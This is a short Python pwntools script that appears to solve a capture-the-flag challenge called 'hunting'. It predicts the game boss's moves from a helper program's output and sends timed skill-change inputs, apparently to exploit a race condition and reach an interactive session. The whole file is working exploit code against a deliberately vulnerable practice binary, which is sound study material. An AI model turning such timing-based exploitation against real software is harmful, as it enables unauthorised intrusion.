# http://nextline.tistory.com/110
from pwn import *

s = process('./hunting')
a = process('./a.out').recv(1024).rstrip().split('\n')
num = 1


def defense():
	if a[num] == '1' :
		return '3'
	elif a[num] == '2':
		return '2'
	else:
		return '1'

def check():
	s.recvuntil('Boss\'s hp is ')
	print 'Boss Hp : ' + s.recvline()
	if -1 < s.recvuntil('=======================================\n').find('level:4\n'):
		return 1
	return 0

def attack():
	s.sendline('2')
	a = check()
	if a == 1:
		return a
	s.sendline(defense())
	s.recvuntil('Your HP is ')
	print 'My HP : ' + s.recvline()
	return a

s.send('3\n3\n') # change skill : iceball
while True:
	if attack() == 1:
		break
	num += 2
s.send(defense() + '\n')
print '############ level 4 ############'

num += 1
payload = "3\n2\n" # change skill : fireball
payload += "2\n" + defense() + "\n"
s.send(payload)
sleep(0.01)

num += 2
payload2 = "3\n7\n" # change skill : icesword
payload2 += "2\n" + defense() + "\n"
s.send(payload2)

sleep(2)

num += 4
payload = "3\n2\n" # change skill : fireball
payload += "2\n" + defense() + "\n"
s.send(payload)
sleep(0.01)

num += 2
payload2 = "3\n7\n" # change skill : icesword
payload2 += "2\n" + defense() + "\n"
s.send(payload2)

s.interactive()
